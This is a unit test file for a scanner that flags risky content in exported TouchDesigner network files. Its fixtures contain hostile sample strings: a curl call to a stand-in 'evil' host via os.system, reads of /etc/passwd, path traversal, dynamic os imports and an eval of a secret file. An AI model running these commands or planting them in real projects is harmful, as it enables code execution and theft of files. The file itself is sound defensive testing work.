import { emptyCapabilityCounts } from "@embody/contracts";
import type { CapabilityCounts } from "@embody/contracts";
import { describe, expect, it } from "vitest";

import { scanTdxn } from "./scanner";

type TdxnRecord = Record<string, unknown>;

function makeTdxn(operators: TdxnRecord[] = [], overrides: TdxnRecord = {}): TdxnRecord {
  return {
    format: "tdn",
    version: "1.4",
    generator: "unit-test",
    td_build: "099.2025.32820",
    exported_at: "2026-06-08T00:00:00Z",
    network_path: "/test",
    options: {
      include_dat_content: true,
      include_storage: true
    },
    type: "baseCOMP",
    operators,
    ...overrides
  };
}

function counts(overrides: Partial<CapabilityCounts> = {}): CapabilityCounts {
  return {
    ...emptyCapabilityCounts(),
    ...overrides
  };
}

function expectEvidenceBounded(result: ReturnType<typeof scanTdxn>): void {
  for (const finding of result.findings) {
    expect(finding.evidence.length).toBeLessThanOrEqual(200);
  }
}

describe("scanTdxn", () => {
  it("returns clean for a source to null network", () => {
    const tdxn = makeTdxn([
      { name: "source1", type: "constantTOP" },
      { name: "null1", type: "nullTOP", inputs: ["source1"] }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("clean");
    expect(result.counts).toEqual(counts());
    expect(result.findings).toEqual([]);
  });

  it("flags execute DAT content and denylisted execute type", () => {
    const tdxn = makeTdxn([
      {
        name: "execute1",
        type: "executeDAT",
        dat_content: "def onStart():\n    return\n",
        dat_content_format: "text"
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(
      counts({ denylisted_types: 1, execute_dats: 1, web_ops: 1 })
    );
    expectEvidenceBounded(result);
  });

  it("flags expression parameters that read files", () => {
    const tdxn = makeTdxn([
      {
        name: "level1",
        type: "levelTOP",
        parameters: {
          opacity: "=open('local.txt').read()"
        }
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ file_read_exprs: 1 }));
  });

  it("treats escaped expression prefixes as literals", () => {
    const tdxn = makeTdxn([
      {
        name: "level1",
        type: "levelTOP",
        parameters: {
          opacity: "==open('local.txt').read()",
          brightness: "~~os.path.exists('/tmp/a')"
        }
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("clean");
    expect(result.counts).toEqual(counts());
  });

  it("counts webclient DAT as web_ops and denylisted_types", () => {
    const tdxn = makeTdxn([{ name: "web1", type: "webclientDAT" }]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ denylisted_types: 1, web_ops: 1 }));
  });

  it("counts COMP extension declarations", () => {
    const tdxn = makeTdxn([
      {
        name: "base1",
        type: "baseCOMP",
        sequences: {
          ext: [
            {
              object: "op('./BaseExt').module.BaseExt(me)",
              name: "BaseExt",
              promote: true
            }
          ]
        },
        children: [
          {
            name: "BaseExt",
            type: "textDAT",
            dat_content: "class BaseExt:\n    pass\n",
            dat_content_format: "text"
          }
        ]
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ extensions: 1 }));
  });

  it("counts non-empty storage payloads", () => {
    const tdxn = makeTdxn([
      {
        name: "base1",
        type: "baseCOMP",
        storage: { payload: "data" }
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ storage_payloads: 1 }));
  });

  it("counts traversal file parameters", () => {
    const tdxn = makeTdxn([
      {
        name: "text1",
        type: "textDAT",
        parameters: {
          file: "../secrets.txt"
        }
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ traversal_paths: 1 }));
  });

  it("blocks oversized input before scanning surfaces", () => {
    const tdxn = makeTdxn([
      {
        name: "text1",
        type: "textDAT",
        dat_content: "x".repeat(5 * 1024 * 1024 + 1),
        dat_content_format: "text"
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("blocked");
    expect(result.counts).toEqual(counts());
    expect(result.findings.length).toBeGreaterThan(0);
    expectEvidenceBounded(result);
  });

  it("scans nested COMP children for evasion", () => {
    const tdxn = makeTdxn([
      {
        name: "outer",
        type: "baseCOMP",
        children: [
          {
            name: "inner",
            type: "baseCOMP",
            children: [
              {
                name: "execute1",
                type: "executeDAT",
                dat_content: "import os\nos.system('id')\n",
                dat_content_format: "text"
              }
            ]
          }
        ]
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(
      counts({ denylisted_types: 1, execute_dats: 1, web_ops: 1 })
    );
  });

  it("flags dynamic import expressions", () => {
    const tdxn = makeTdxn([
      {
        name: "math1",
        type: "mathCHOP",
        parameters: {
          postadd: "=getattr(__import__('os'), 'system')('id')"
        }
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ file_read_exprs: 1 }));
  });

  it("counts storage payload evasion", () => {
    const tdxn = makeTdxn([
      {
        name: "base1",
        type: "baseCOMP",
        storage: {
          payload: "eval(open('../secret.py').read())"
        }
      }
    ]);

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ storage_payloads: 1 }));
  });

  it("counts external refs for tdn_ref and tox_ref", () => {
    for (const key of ["tdn_ref", "tox_ref"] as const) {
      const tdxn = makeTdxn([{ name: "child1", type: "baseCOMP", [key]: "child1.tdn" }]);
      const result = scanTdxn(tdxn);

      expect(result.verdict).toBe("flagged");
      expect(result.counts).toEqual(counts({ external_refs: 1 }));
      expectEvidenceBounded(result);
    }
  });

  it("merges type defaults into effective parameters", () => {
    const tdxn = makeTdxn(
      [{ name: "level1", type: "levelTOP" }],
      {
        type_defaults: {
          levelTOP: {
            parameters: {
              opacity: "=open('default.txt').read()"
            }
          }
        }
      }
    );

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(counts({ file_read_exprs: 1 }));
  });

  it("detects every scanner surface in the adversarial integration fixture", () => {
    const tdxn = {
      format: "tdn",
      version: "1.4",
      network_path: "/test",
      type: "baseCOMP",
      operators: [
        {
          name: "execute1",
          type: "executeDAT",
          dat_content: "import os\nos.system('curl http://evil')\n",
          dat_content_format: "text",
          parameters: { active: "=op('ctrl').par.On" }
        },
        {
          name: "glow1",
          type: "levelTOP",
          parameters: { gamma: "=open('/etc/passwd').read()" }
        },
        {
          name: "rig1",
          type: "baseCOMP",
          sequences: { ext: [{ object: "RigExt", name: "Rig" }] },
          storage: { secret: "payload" }
        },
        { name: "net1", type: "webclientDAT" },
        {
          name: "mov1",
          type: "moviefileinTOP",
          parameters: { file: "../../../etc/passwd" }
        }
      ]
    };

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("flagged");
    expect(result.counts).toEqual(
      counts({
        denylisted_types: 3,
        execute_dats: 1,
        extensions: 1,
        file_read_exprs: 1,
        storage_payloads: 1,
        traversal_paths: 1,
        web_ops: 3
      })
    );
  });

  it("fails closed on internal scan errors", () => {
    const tdxn = makeTdxn([{ name: "null1", type: "nullTOP" }]);
    Object.defineProperty(tdxn, "type_defaults", {
      enumerable: false,
      get() {
        throw new Error("boom");
      }
    });

    const result = scanTdxn(tdxn);

    expect(result.verdict).toBe("blocked");
    expect(result.counts).toEqual(counts());
    expect(result.findings.some((finding) => finding.detail.startsWith("scanner aborted"))).toBe(
      true
    );
  });
});
